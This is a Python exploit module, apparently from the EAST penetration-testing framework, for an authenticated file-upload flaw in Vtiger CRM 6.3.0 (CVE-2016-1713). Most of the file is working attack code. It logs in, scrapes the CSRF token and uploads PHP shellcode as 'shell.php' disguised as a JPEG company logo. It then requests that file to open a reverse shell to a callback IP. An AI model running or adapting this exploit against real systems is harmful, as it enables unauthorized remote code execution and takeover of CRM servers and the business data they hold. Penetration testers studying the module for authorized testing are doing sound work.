#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import re
import time
from collections import OrderedDict
import requests

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_vtiger_crm_fu_rce"
INFO['DESCRIPTION'] = "Vtiger CRM 6.3.0 - Arbitrary File Upload / Remote Code Execution"
INFO['VENDOR'] = "https://www.vtiger.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/44379/']
INFO["CVE Name"] = "CVE-2016-1713"
INFO["NOTES"] = """Vtiger 6.3.0 CRM's administration interface allows for the upload of a company logo. Instead of uploading an image, an attacker may choose to upload a
file containing PHP code and run this code by accessing the resulting PHP file. This module was tested against vTiger CRM v6.3.0.
"""

INFO['CHANGELOG'] = "03 Apr, 2018. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.207", dict(description = 'Target IP')
OPTIONS["PORT"] = 8888, dict(description = 'Target port')
OPTIONS['USERNAME'] = 'admin', dict(description = 'Username')
OPTIONS['PASSWORD'] = 'password', dict(description = 'Password')
OPTIONS["BASEPATH"] = '/', dict(description = 'Basepath')
OPTIONS["CALLBACK_IP"] = "192.168.1.43", dict(description = 'Callback IP')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.username = ''
        self.password = ''
        self.basepath = OPTIONS["BASEPATH"]
        self.callback_ip = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.username = self.args.get('USERNAME', self.username)
        self.password = self.args.get('PASSWORD', self.password)
        self.basepath = self.args.get('BASEPATH', self.basepath)
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
        
        self.s = requests.Session()
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}{}'.format(self.host, self.port, self.basepath, path)
    
    def make_sploit(self):
        self.log("[>] Generate shellcode started")
        
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            return None

        s = Shellcodes.CrossOSShellcodes(self.callback_ip, port)
        shellcode = s.create_shellcode(ShellUtils.Constants.ShellcodeType.PHP, True)

        self.log("[>] Shellcode ready")
        return shellcode
        
    def update_csrf(self):
        url = self.make_url('index.php')
        try:
            r = self.s.get(url)
            csrf = re.findall('var csrfMagicToken = \"(.*)\";var', r.text)[0]
        except Exception as e:
            print e

        return csrf
    
    def make_data(self, payload):
        data = ''
            
        data += '--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="__vtrftk"\r\n\r\n'
        data += self.update_csrf()
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="module"\r\n\r\n'
        data += 'Vtiger'
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="parent"\r\n\r\n'
        data += 'Settings'
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="action"\r\n\r\n'
        data += 'CompanyDetailsSave'
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="logo"; filename="shell.php"\r\n'
        data += 'Content-Type: image/jpeg\r\n\r\n'
        data += payload
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="organizationname"\r\n\r\n'
        data += 'vtiger'
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="address"\r\n\r\n'
        data += ' '
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="city"\r\n\r\n'
        data += ' '
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="State"\r\n\r\n'
        data += ' '
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="code"\r\n\r\n'
        data += ' '
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="country"\r\n\r\n'
        data += ' '
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="phonxe"\r\n\r\n'
        data += ' '
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="fax"\r\n\r\n'
        data += ' '
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="website"\r\n\r\n'
        data += ' '
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="vatid"\r\n\r\n'
        data += ' '
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="saveButton"\r\n\r\n'
        data += ' '
        data += '\r\n--o0oOo0o--\r\n'
        return data
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        if self.is_listener_connected() is None:
            self.log('Please, enable listener to use this module')
            self.finish(False)
        
        
        self.log('Authentificating with {}:{}'.format(self.username, self.password))
        
        url = self.make_url('index.php?module=Users&action=Login')
        data = {}
        data['username'] = self.username
        data['password'] = self.password
        data['__vtrftk'] = self.update_csrf()

        try:
            r = self.s.post(url, data=data, allow_redirects=False)
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.log('OK')
        
        url = self.make_url('index.php')
        data = self.make_data('<?' + self.make_sploit()[6:])

        try:
            r = self.s.post(url, data=data, headers={'Content-type': 'multipart/form-data; boundary=o0oOo0o'}, allow_redirects=False)
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.log('All files uploaded. Execute shell.php ...')
        try:
            r = self.s.get(self.make_url('test/logo/shell.php'), timeout=3)
        except Exception as e:
            pass
            
        while True:
            if self.is_listener_connected():
                break
            time.sleep(3)
        
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
